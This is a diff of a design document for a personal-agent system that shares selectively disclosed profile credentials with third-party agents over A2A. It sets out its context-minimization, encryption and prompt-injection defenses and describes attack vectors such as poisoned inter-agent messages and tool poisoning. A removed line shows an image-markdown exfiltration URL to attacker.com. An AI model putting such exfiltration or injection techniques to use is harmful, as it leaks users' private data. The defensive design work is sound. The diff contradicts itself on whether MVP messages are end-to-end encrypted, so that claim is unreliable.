@@ -83,7 +83,7 @@ A2A (v1.0, Linux Foundation, Apache 2.0) is the emerging standard for agent inte
 
 | Concept | What It Is | How We Extend It |
 |---------|-----------|-----------------|
-| **Agent Card** | JSON metadata at `/.well-known/agent-card.json` — name, endpoint, skills, auth schemes | Add mandatory JWS signing, DID anchoring, privacy policy declaration, capability constraints |
+| **Agent Card** | JSON metadata at `/.well-known/agent.json` — name, endpoint, skills, auth schemes | Add mandatory JWS signing, DID anchoring, privacy policy declaration, capability constraints |
 | **Task** | Stateful work unit (WORKING → COMPLETED/FAILED/CANCELED/REJECTED/INPUT_REQUIRED) | Add consent states: `USER_CONSENT_REQUIRED`, `PRIVACY_CHECK_REQUIRED` |
 | **Message** | Communication turn with Parts (text, raw, url, data) | Enforce structured `data` Parts for inter-agent payloads — never raw text containing instructions |
 | **Extensions** | Formal extension system (data-only, profile, method) with negotiation | Define privacy, consent, and security extensions |
@@ -94,9 +94,10 @@ A2A (v1.0, Linux Foundation, Apache 2.0) is the emerging standard for agent inte
 | Gap | Risk | Our Solution |
 |-----|------|-------------|
 | No mandatory Agent Card signing | Agent spoofing/impersonation | Mandatory JWS + DID verification |
-| No message-level encryption | Data exposure if TLS is compromised | End-to-end encrypted Parts using recipient's public key |
+| No message-level encryption | Data exposure if TLS is compromised | **Phase 2**: Sign-then-encrypt via DIDComm v2 authcrypt (bare age has no sender auth — deferred after adversarial review). MVP uses TLS. |
 | No consent mechanism | Data shared without user approval | `USER_CONSENT_REQUIRED` task state + consent metadata |
-| No prompt injection defense | Cross-agent manipulation | CaMeL-style capability enforcement + structured data |
+| No prompt injection defense | Cross-agent manipulation | Data-minimized sharing (pipeline never has unauthorized data) + structured data only |
+| No context minimization | Agent has more data than needed for a task | Sharing pipeline loads only approved credential files; enforced by module architecture |
 | No fine-grained authorization | Over-sharing of data | ABAC with purpose-bound, time-limited, field-level controls |
 | No audit trail | Cannot verify what was shared | Cryptographically signed interaction logs |
 | No agent reputation | Cannot assess trustworthiness | Progressive trust model with on-chain attestations |
@@ -140,105 +141,143 @@ OpenClaw's catastrophic failure (25,000 GitHub stars in one day → 135,000 expo
 
 ## 5. Architecture Design
 
+### Core Principle: Least-Context Architecture
+
+> **The best way to prevent data leakage is to never give the agent the sensitive data in the first place.**
+
+This principle — drawn from IsolateGPT (NDSS 2025), CaMeL (Google DeepMind), FIDES (Microsoft), and Apple Private Cloud Compute — drives the entire architecture. Rather than one Guardian Agent with full profile access, we use **context-scoped ephemeral instances** where each interaction gets only the minimum data it needs.
+
 ### System Overview
 
 ```
-┌─────────────────────────────────────────────────────────────────────┐
-│                         USER'S MACHINE                              │
-│                                                                     │
-│  ┌──────────────┐    ┌──────────────────────────────────────────┐   │
-│  │   CLI Tool    │───▶│         Personal Agent (Guardian)        │   │
-│  │  agentverse   │    │                                          │   │
-│  └──────────────┘    │  ┌────────────┐  ┌────────────────────┐  │   │
-│                      │  │  Profile    │  │  Credential Wallet │  │   │
-│  ┌──────────────┐    │  │  Extractor  │  │  (VCs + BBS+ sigs) │  │   │
-│  │ LLM History  │───▶│  └────────────┘  └────────────────────┘  │   │
-│  │ Claude Code  │    │                                          │   │
-│  │ ChatGPT      │    │  ┌────────────┐  ┌────────────────────┐  │   │
-│  │ etc.         │    │  │  Privacy    │  │  Consent Manager   │  │   │
-│  └──────────────┘    │  │  Engine     │  │  (ABAC + purpose)  │  │   │
-│                      │  └────────────┘  └────────────────────┘  │   │
-│                      │                                          │   │
-│                      │  ┌────────────┐  ┌────────────────────┐  │   │
-│                      │  │  A2A Client │  │  Prompt Injection  │  │   │
-│                      │  │  (outbound) │  │  Defense (CaMeL)   │  │   │
-│                      │  └─────┬──────┘  └────────────────────┘  │   │
-│                      └────────┼──────────────────────────────────┘   │
-│                               │                                      │
-└───────────────────────────────┼──────────────────────────────────────┘
-                                │  A2A Protocol (HTTPS + E2E encryption)
-                                │  Signed Agent Cards, Scoped OAuth tokens
-                                ▼
-┌───────────────────────────────────────────────────────────────────────┐
-│                      THIRD-PARTY AGENTS                               │
-│                                                                       │
-│  ┌─────────────────┐  ┌──────────────────┐  ┌─────────────────────┐  │
-│  │  Ditto AI        │  │  WeKruit          │  │  Other App Agent   │  │
-│  │  (Dating)        │  │  (Recruiting)     │  │                    │  │
-│  │                  │  │                   │  │                    │  │
-│  │  Agent Card:     │  │  Agent Card:      │  │  Agent Card:       │  │
-│  │  - Signed (JWS)  │  │  - Signed (JWS)   │  │  - Signed (JWS)    │  │
-│  │  - DID anchored  │  │  - DID anchored   │  │  - DID anchored    │  │
-│  │  - Skills listed │  │  - Skills listed  │  │  - Skills listed   │  │
-│  │  - Privacy policy│  │  - Privacy policy │  │  - Privacy policy  │  │
-│  │                  │  │                   │  │                    │  │
-│  │  Receives:       │  │  Receives:        │  │  Receives:         │  │
-│  │  - VP (selective │  │  - VP (selective  │  │  - VP (selective   │  │
-│  │    disclosure)   │  │    disclosure)    │  │    disclosure)     │  │
-│  │  - ZK proofs     │  │  - ZK proofs      │  │  - ZK proofs       │  │
-│  │  - Scoped token  │  │  - Scoped token   │  │  - Scoped token    │  │
-│  └─────────────────┘  └──────────────────┘  └─────────────────────┘  │
-└───────────────────────────────────────────────────────────────────────┘
+┌──────────────────────────────────────────────────────────────────────────┐
+│                           USER'S MACHINE                                  │
+│                                                                          │
+│  ┌──────────────┐    ┌────────────────────────────────────────────────┐  │
+│  │   CLI Tool    │───▶│            ORCHESTRATOR (no profile data)      │  │
+│  │  agentverse   │    │                                                │  │
+│  └──────────────┘    │  Knows WHO to talk to, not WHAT to share.      │  │
+│                      │  Never loads profile into its own context.      │  │
+│  ┌──────────────┐    │                                                │  │
+│  │ LLM History  │    │  ┌──────────────┐  ┌───────────────────────┐  │  │
+│  │ Claude Code  │    │  │  Agent Card   │  │  Consent Manager      │  │  │
+│  │ ChatGPT      │    │  │  Discovery &  │  │  (ABAC policies,     │  │  │
+│  │ etc.         │    │  │  Verification │  │   decides WHAT can    │  │  │
+│  └──────┬───────┘    │  └──────────────┘  │   be shared)          │  │  │
+│         │            │                     └───────────┬───────────┘  │  │
+│         │            │                                 │              │  │
+│         │            │  Per-interaction, spawns:        │              │  │
+│         │            │  ┌──────────────────────────────────────────┐  │  │
+│         │            │  │  SCOPED AGENT INSTANCE (ephemeral)       │  │  │
+│  ┌──────▼───────┐    │  │                                          │  │  │
+│  │  Profile      │    │  │  Context contains ONLY:                 │  │  │
+│  │  Extractor    │    │  │  - The 3 approved attributes            │  │  │
+│  │  (offline)    │    │  │  - Recipient's public key               │  │  │
+│  └──────┬───────┘    │  │  - Scoped task instructions              │  │  │
+│         │            │  │                                          │  │  │
+│  ┌──────▼───────┐    │  │  Not loaded (by module design):         │  │  │
+│  │  Credential   │    │  │  - Full profile (no import path)        │  │  │
+│  │  Wallet       │    │  │  - Other credentials (not requested)    │  │  │
+│  │  (encrypted   │◄──┼──│  - Wallet keys (not passed via IPC)     │  │  │
+│  │   at rest)    │    │  │  Note: code architecture, not OS        │  │  │
+│  └──────────────┘    │  │  sandbox. Phase 2 adds enforcement.     │  │  │
+│                      │  │                                          │  │  │
+│                      │  │  ┌────────────┐  ┌───────────────────┐  │  │  │
+│                      │  │  │ Privacy    │  │ A2A Client        │  │  │  │
+│                      │  │  │ Engine     │  │ (send only,       │  │  │  │
+│                      │  │  │ (VP gen)   │  │  send only)       │  │  │  │
+│                      │  │  └────────────┘  └────────┬──────────┘  │  │  │
+│                      │  └───────────────────────────┼─────────────┘  │  │
+│                      └──────────────────────────────┼────────────────┘  │
+│                                                     │                    │
+└─────────────────────────────────────────────────────┼────────────────────┘
+                                                      │
+                          A2A Protocol over HTTPS      │
+                          (E2E encryption: Phase 2)     │
+                          + JWS-signed Agent Cards      │
+                                                      ▼
+┌──────────────────────────────────────────────────────────────────────────┐
+│                        THIRD-PARTY AGENTS                                 │
+│                                                                          │
+│  Agent Card includes:                                                    │
+│    - keyAgreement: X25519 public key (for age encryption)                │
+│    - DID, JWS signature, privacy policy, skills                          │
+│                                                                          │
+│  Receives ONLY:                                                          │
+│    - age-encrypted VP (selective disclosure)                              │
+│    - Scoped token (purpose-bound, time-limited)                          │
+│    - Cannot see A2A envelope content beyond routing metadata              │
+└──────────────────────────────────────────────────────────────────────────┘
 ```
+
+### Why Context-Scoped Instances (Not a Single Guardian)
+
+| Single Guardian (old design) | Context-Scoped Instances (new design) |
+|------------------------------|--------------------------------------|
+| Guardian has full profile in context | Orchestrator never loads profile |
+| If compromised, all data exposed | If compromised, only 3 approved attributes exposed |
+| Must trust prompt injection defense | Doesn't need to — data isn't there to leak |
+| One long-lived process | Ephemeral per-interaction, destroyed after |
+| Shared memory across interactions | Isolated memory — Agent A's data can't reach Agent B |
+
+This is inspired by:
+- **IsolateGPT** (NDSS 2025): Hub-and-spoke model where isolated "spokes" get only needed data
+- **Apple Private Cloud Compute**: Stateless computation, data exists only in memory during processing, leaves no trace
+- **CaMeL** (Google DeepMind): Control flow (orchestrator) separated from data flow (scoped instance)
+- **FIDES** (Microsoft): Taint labels track data provenance; variables referenced by ID, not injected as raw tokens
 
 ### Component Responsibilities
 
-| Component | Role |
-|-----------|------|
-| **CLI Tool (`agentverse`)** | User interface — profile management, consent approvals, agent discovery |
-| **Profile Extractor** | Reads LLM conversation history, produces structured profile (skills, preferences, values, experience) |
-| **Credential Wallet** | Issues and stores W3C Verifiable Credentials with BBS+ signatures over profile attributes |
-| **Privacy Engine** | Generates selective disclosures (VPs), ZK proofs, and (later) encrypted computations |
-| **Consent Manager** | ABAC policy engine — decides what can be shared, with whom, for what purpose, until when |
-| **A2A Client** | Handles A2A protocol communication — Agent Card discovery, task management, message exchange |
-| **Prompt Injection Defense** | CaMeL-style capability enforcement — separates control flow from data flow, validates all incoming agent messages |
+| Component | Role | Has Profile Access? |
+|-----------|------|:-------------------:|
+| **CLI Tool (`agentverse`)** | User interface — extraction, review, sharing, consent | No |
+| **Orchestrator** | Agent discovery, consent evaluation, spawns scoped instances | No — only policy metadata |
+| **Profile Extractor** | Reads LLM history, produces structured profile (offline, not during sharing) | Yes (extraction only) |
+| **Credential Wallet** | Stores encrypted BBS+ signed VCs; releases specific VCs to scoped instances | Encrypted at rest |
+| **Scoped Agent Instance** | Ephemeral per-interaction: generates VP, encrypts, sends via A2A | Only approved attributes |
+| **Privacy Engine** | Within scoped instance: BBS+ selective disclosure, VP generation | Only approved attributes |
+| **Consent Manager** | ABAC policy engine — decides what to share, with whom, for what purpose | No — only attribute names |
+| **A2A Client** | Within scoped instance: Agent Card fetch, SendMessage (JSON-RPC 2.0) | Only the VP payload |
 
 ### Data Flow: Sharing Profile with Ditto AI (Example)
 
 ```
 1. User runs: agentverse share --with ditto.ai --purpose dating-profile
 
-2. CLI fetches Ditto AI's Agent Card from https://ditto.ai/.well-known/agent-card.json
-   ├── Verifies JWS signature against Ditto's DID
-   ├── Checks trust level (progressive trust model)
-   └── Reads requested skills/attributes and privacy policy
+2. ORCHESTRATOR (no profile data in context):
+   ├── Fetches Agent Card from https://ditto.ai/.well-known/agent.json
+   ├── Verifies JWS signature against did:web:ditto.ai:agent
+   ├── Extracts keyAgreement public key (X25519) for E2E encryption
+   ├── Checks trust level
+   └── Reads requested attributes and privacy policy
 
-3. Consent Manager evaluates:
+3. CONSENT MANAGER (sees attribute names only, not values):
    ├── What attributes does Ditto request? (interests, age_range, location_city)
-   ├── What purpose? (dating-profile — matches declared purpose in Agent Card)
+   ├── What purpose? (dating-profile)
    ├── What duration? (30 days)
    └── User approves via CLI prompt (or pre-authorized policy)
 
-4. Privacy Engine generates:
-   ├── Verifiable Presentation with BBS+ selective disclosure
-   │   └── Contains only: interests, age_range, location_city (not full profile)
-   ├── ZK proof: "user.age >= 18" (without revealing exact age)
-   └── Scoped OAuth token: read-only, 30-day expiry, purpose-bound
+4. ORCHESTRATOR spawns SCOPED AGENT INSTANCE:
+   ├── Requests only {interests, age_range, location_city} VCs from Wallet
+   ├── Wallet decrypts and releases ONLY those 3 credential claims
+   ├── Injects: approved claims + Ditto's X25519 public key + task instructions
+   └── Instance has NO access to wallet, full profile, or other agents' data
 
-5. A2A Client sends SendMessage to Ditto's A2A endpoint:
-   ├── Message contains structured data Part (not free text)
-   ├── VP + ZK proofs in artifact
-   ├── Token in Authorization header
-   └── All Parts encrypted with Ditto's public key
+5. SCOPED INSTANCE (isolated context with only 3 attributes):
+   ├── Generates VP with BBS+ selective disclosure (only approved claims)
+   ├── Signs plaintext VP with JWS
+   ├── Encrypts VP payload with Ditto's X25519 key (age encryption)
+   ├── Sends A2A SendMessage: encrypted VP as DataPart
+   └── Instance is DESTROYED — no residual context
 
-6. Ditto's agent processes the VP:
-   ├── Verifies BBS+ signatures (issuer = user's agent)
-   ├── Verifies ZK proofs
+6. Ditto's agent:
+   ├── Decrypts payload with its private key (only Ditto can decrypt)
+   ├── Verifies BBS+ signatures
    ├── Uses disclosed attributes for profile creation
    └── Cannot access any undisclosed attributes
 
-7. Audit log entry created (signed, timestamped):
-   └── "Shared {interests, age_range, location_city} with ditto.ai for dating-profile, expires 2026-04-14"
+7. Audit log (on orchestrator, no profile data):
+   └── "Shared {interests, age_range, location_city} with ditto.ai, expires 2026-04-14"
 ```
 
 ---
@@ -271,10 +310,11 @@ Profile Extraction          Credential Issuance           Selective Disclosure
                                                          └───────────────────┘
 ```
 
-**Libraries**:
-- `@mattrglobal/bbs-signatures` (JavaScript/TypeScript)
-- `jsonld-signatures-bbs` (JSON-LD integration)
-- W3C Data Integrity BBS Cryptosuites v1.0
+**Libraries** (updated after adversarial review):
+- `@digitalbazaar/bbs-2023-cryptosuite` v2.0+ (primary — most aligned with W3C spec)
+- `@digitalbazaar/bbs-signatures` v3.0+ (core BBS+ operations)
+- `@digitalbazaar/bls12-381-multikey` (key management)
+- MATTR WASM fallback if pure-JS performance exceeds targets by 5x+
 
 ### Phase 2: Zero-Knowledge Proofs for Predicate Verification
 
@@ -327,84 +367,165 @@ fn main(
 
 ---
 
-## 7. Prompt Injection Defense Architecture
+## 7. Defense Architecture: Context Minimization + Prompt Injection + P2P Security
 
-### Why This Is Critical
+### The Unified Principle
 
-Prompt injection is the **#1 LLM vulnerability** (OWASP 2025/2026). OpenAI has admitted it "may never be fully solved" for browsing agents. In agent-to-agent communication, the risk is amplified:
+> **You can't leak what you don't have. You can't intercept what you can't decrypt. You can't inject into what doesn't process your input.**
 
-- One compromised agent can corrupt an entire mesh through poisoned messages
-- Malicious prompts embedded in Agent Card fields, task descriptions, and artifacts
-- 5.5% of MCP servers exhibit tool poisoning attacks
-- Adaptive attacks bypass >90% of published AI-based defenses
+These three threats — data leakage, eavesdropping, and prompt injection — are all addressed by the same architectural principle: **minimize the attack surface by minimizing what each component can access**.
 
-### Our Defense: CaMeL-Inspired Capability Architecture
+### 7.1 Context Minimization (Primary Defense)
 
-We adopt the architectural principles from **CaMeL** (Google DeepMind, 2025) — traditional security principles (control flow integrity, access control, information flow control) enforced mechanically, NOT by asking another LLM to judge safety.
+This is the **strongest** defense and the foundation of the entire security architecture. Rather than trying to prevent an agent from leaking data it has access to (which adaptive attacks bypass >90% of the time), we ensure the agent never has unauthorized data in the first place.
 
-**Core principle**: *Once an LLM agent has ingested untrusted input, it must be constrained so that input cannot trigger any consequential actions.*
+**Research basis**:
+- **CaMeL** (Google DeepMind, 2025): Separates control flow from data flow; variables referenced by ID, not injected as raw tokens
+- **IsolateGPT** (NDSS 2025): Hub-and-spoke model with <30% overhead; isolated spokes get only needed data
+- **FIDES** (Microsoft, 2025): Taint labels on every value; deterministically blocks all policy-violating data flows
+- **SEAgent** (January 2026): Mandatory access control for agents; 0% attack success rate across all tested vectors
+- **Apple Private Cloud Compute**: Stateless computation; data exists only in memory during processing; even Apple staff cannot access it
+
+**How it works in Agentverse**:
 
 ```
-┌──────────────────────────────────────────────────────────────┐
-│                    GUARDIAN AGENT                              │
-│                                                               │
-│  ┌──────────────────┐     ┌──────────────────────────────┐   │
-│  │  TRUSTED ZONE     │     │  QUARANTINED ZONE             │   │
-│  │  (Privileged LLM) │     │  (Restricted LLM)             │   │
-│  │                   │     │                               │   │
-│  │  - Sees system    │     │  - Processes incoming A2A     │   │
-│  │    prompt only    │     │    messages from other agents  │   │
-│  │  - Plans actions  │     │  - NO tool access             │   │
-│  │  - Has tool access│     │  - NO capability tokens       │   │
-│  │  - Writes VPs     │     │  - Extracts structured data   │   │
-│  │                   │     │    from agent messages         │   │
-│  │                   │     │  - Output is DATA ONLY         │   │
-│  └────────┬─────────┘     └──────────┬────────────────────┘   │
-│           │                          │                        │
-│           │    ┌─────────────┐       │                        │
-│           └───▶│  CAPABILITY  │◀──────┘                        │
-│                │  ENFORCER    │                                │
-│                │              │                                │
-│                │  - Validates │                                │
-│                │    all tool  │                                │
-│                │    calls     │                                │
-│                │  - Checks    │                                │
-│                │    data flow │                                │
-│                │    policies  │                                │
-│                │  - Blocks    │                                │
-│                │    exfil     │                                │
-│                └─────────────┘                                │
-└──────────────────────────────────────────────────────────────┘
+┌─────────────────────────────────────────────────────────────────────┐
+│                     CONTEXT MINIMIZATION FLOW                        │
+│                                                                     │
+│  ORCHESTRATOR                    CREDENTIAL WALLET                  │
+│  (no profile data)               (encrypted at rest)                │
+│         │                               │                           │
+│         │  1. Consent approved for      │                           │
+│         │     {interests, age_range}    │                           │
+│         │                               │                           │
+│         │  2. Request ONLY those        │                           │
+│         │     2 credential claims ────▶ │                           │
+│         │                               │                           │
+│         │  3. Wallet decrypts &         │                           │
+│         │     releases ONLY those 2 ◀── │                           │
+│         │                               │                           │
+│         │  4. Spawn SCOPED INSTANCE     │                           │
+│         │     with only:                │                           │
+│         │     - interests claim         │                           │
+│         │     - age_range claim         │                           │
+│         │     - recipient's pubkey      │                           │
+│         │     - "generate VP & send"    │                           │
+│         ▼                               │                           │
+│  ┌──────────────────────┐               │                           │
+│  │ SCOPED INSTANCE       │               │                           │
+│  │                       │               │                           │
+│  │ CAN see:  2 claims   │  Even if fully compromised,               │
+│  │ CAN do:   gen VP,    │  this pipeline can only leak              │
+│  │           A2A send   │  {interests, age_range} — not             │
+│  │                       │  the full profile.                        │
+│  │                       │                                           │
+│  │ NOT LOADED (by design):                                           │
+│  │   wallet, full profile, other credentials                         │
+│  │   (enforced by code architecture,                                 │
+│  │    not OS sandbox — see Phase 2)                                  │
+│  └──────────────────────┘                                           │
+│         │                                                           │
+│         │  5. VP generated, encrypted, sent                         │
+│         │  6. Instance DESTROYED — zero residual context            │
+└─────────┼───────────────────────────────────────────────────────────┘
+          ▼
+   A2A SendMessage (age-encrypted DataPart)
 ```
 
-### The Six Defense Patterns Applied
+### 7.2 P2P Security (Outsiders Can't Listen In)
 
-We implement the six design patterns from Beurer-Kellner et al. (2025):
+A2A mandates TLS but provides **no message-level encryption**. If TLS terminates at a CDN, load balancer, or reverse proxy, plaintext is exposed. Our P2P layer ensures only the intended recipient can read the payload.
 
-| Pattern | How We Apply It |
-|---------|----------------|
-| **Dual LLM** | Privileged LLM (trusted, has tools) never sees untrusted agent messages. Quarantined LLM (no tools) processes all external input. |
-| **Plan-Then-Execute** | The privileged LLM pre-approves a plan (e.g., "share {interests, age_range} with ditto.ai"). Any action not in the plan is blocked. |
-| **Context Minimization** | After extracting structured data from an agent's message, the raw message is discarded — the privileged LLM never sees it. |
-| **Structured Data Separation** | All inter-agent payloads use A2A `data` Parts (structured JSON), never free-text `text` Parts. Instructions and data are in separate channels. |
-| **Action-Selector** | When selecting which agent to interact with, the LLM never sees output from previous agent interactions — preventing feedback loops. |
-| **Map-Reduce** | When processing messages from multiple agents, each is handled by an isolated LLM instance — preventing cross-contamination. |
+**Phased approach**:
 
-### Concrete Defenses
+| Phase | Protocol | Properties | Use Case |
+|-------|----------|-----------|----------|
+| **MVP** | **age X25519** encryption | E2E confidentiality, ephemeral keys per message, post-quantum option (`age1pq1...`) | One-shot VP sharing with any agent |
+| **Phase 2** | **Noise IK/XX** handshake | Mutual authentication, forward secrecy, session continuity | Repeated communication with trusted agents |
+| **Phase 2** | **DIDComm v2 authcrypt** | DIF standard, mediator routing, sender authentication | Standards-compliant E2E channels |
+| **Phase 3** | **MLS (RFC 9420)** | O(log N) group key ops, forward secrecy, post-compromise security | Multi-agent group communication |
 
-1. **Structured-only inter-agent communication**: All A2A messages between agents use `data` Parts with JSON schema validation. Free-text `text` Parts from external agents are treated as untrusted display content only — never parsed for instructions.
+**MVP implementation — age-encrypted Data Parts**:
 
-2. **Agent Card validation pipeline**:
-   ```
-   Fetch Agent Card → Verify JWS signature → Resolve DID → Check trust level
-   → Validate skill descriptions against known-safe patterns → Accept/Reject
-   ```
+```
+A2A Message (envelope in plaintext for routing):
+{
+  "jsonrpc": "2.0",
+  "method": "message/send",
+  "params": {
+    "message": {
+      "role": "user",
+      "parts": [{
+        "type": "data",
+        "data": {
+          "encrypted": true,
+          "algorithm": "age-X25519",
+          "ciphertext": "YWdlLWVuY3J5cHRpb24ub3JnL3YxCi0+IFgy...",
+          "recipientKeyId": "did:web:ditto.ai:agent#key-agreement-1"
+        }
+      }]
+    }
+  }
+}
+```
 
-3. **Canary tokens**: Unique markers in the user's profile data. If any appear in outbound messages to unexpected recipients, the system flags a data exfiltration attempt.
+**Key discovery** requires zero additional round trips — piggybacked on Agent Card discovery:
 
-4. **Output filtering**: All outbound data is validated against the consent policy. The Capability Enforcer blocks any data flow not explicitly authorized.
+```json
+{
+  "name": "ditto-ai-agent",
+  "url": "https://ditto.ai/a2a",
+  "did": "did:web:ditto.ai:agent",
+  "keyAgreement": [{
+    "id": "did:web:ditto.ai:agent#key-agreement-1",
+    "type": "X25519KeyAgreementKey2020",
+    "publicKeyMultibase": "z6LSbysY2xFMRpGMhb7tFTLMpeuPRaqaWM1yECx2AtzE3KCc"
+  }],
+  "skills": [...]
+}
+```
 
-5. **No markdown/HTML rendering of external content**: Prevents image-based data exfiltration (`![](https://attacker.com/steal?data=...)`).
+**Threat coverage**:
+
+| Threat | TLS Only | TLS + age E2E |
+|--------|----------|---------------|
+| Network eavesdropper | Protected | Protected |
+| Compromised CDN/load balancer | **EXPOSED** | Protected (can't decrypt payload) |
+| Cloud provider memory inspection | **EXPOSED** | Protected (plaintext only in scoped instance) |
+| DNS hijacking + fraudulent cert | **EXPOSED** | Protected (age uses recipient's key, not TLS cert) |
+| Compromised proxy | **EXPOSED** | Protected (A2A envelope visible, payload encrypted) |
+
+### 7.3 Prompt Injection Defense (Layered)
+
+With context minimization as the primary defense, prompt injection becomes a **bounded-blast-radius** problem rather than a catastrophic one. Even if injection succeeds, the scoped instance only has the approved attributes.
+
+**Layer 1 — Context Minimization** (structural, no AI involved):
+- Scoped instance has only approved attributes — injection can't access what isn't there
+- Instance is ephemeral — no persistent memory to poison
+- No tools beyond VP generation and A2A send — can't exfiltrate via tool abuse
+
+**Layer 2 — Structured Data Only** (protocol-level):
+- All inter-agent payloads use A2A `data` Parts (structured JSON with schema validation)
+- Free-text `text` Parts from external agents are rejected, never parsed as instructions
+- Instructions and data travel in separate channels
+
+**Layer 3 — Information Flow Control** (system-level, Phase 2):
+- **FIDES-style taint labels**: Every value carries provenance metadata (who produced it, what policies apply)
+- **SEAgent-style MAC**: Mandatory access control rules enforced at tool-call boundaries
+- **CaMeL capability tokens**: Variables referenced by ID, not injected as raw content into LLM context
+
+**Layer 4 — Agent Card Validation** (verification):
+```
+Fetch Agent Card → Verify JWS → Resolve DID → Check trust level
+→ Validate skill descriptions against safe patterns → Accept/Reject
+```
+
+**Layer 5 — Output Validation** (defense in depth):
+- All outbound data validated against consent policy before sending
+- Canary tokens in profile data detect unauthorized exfiltration attempts
+- No markdown/HTML rendering of external content (prevents image-based exfil)
+
+**Why this is stronger than Dual LLM alone**: The Dual LLM pattern (privileged + quarantined LLM) is a good defense, but it still requires the privileged LLM to have access to the full profile. Our approach goes further — the orchestrator (which handles untrusted input like Agent Card discovery) **never has the profile data**. The scoped instance (which has some profile data) **never processes untrusted input** — it only generates and sends.
 
 ---
 
@@ -482,7 +603,7 @@ Level 4: PRIVILEGED     — Extended relationship, pre-authorized policies
 1. User requests: "share profile with ditto.ai"
 
 2. Fetch Agent Card:
-   GET https://ditto.ai/.well-known/agent-card.json
+   GET https://ditto.ai/.well-known/agent.json
 
 3. Verify signature:
    ├── Extract JWS from card
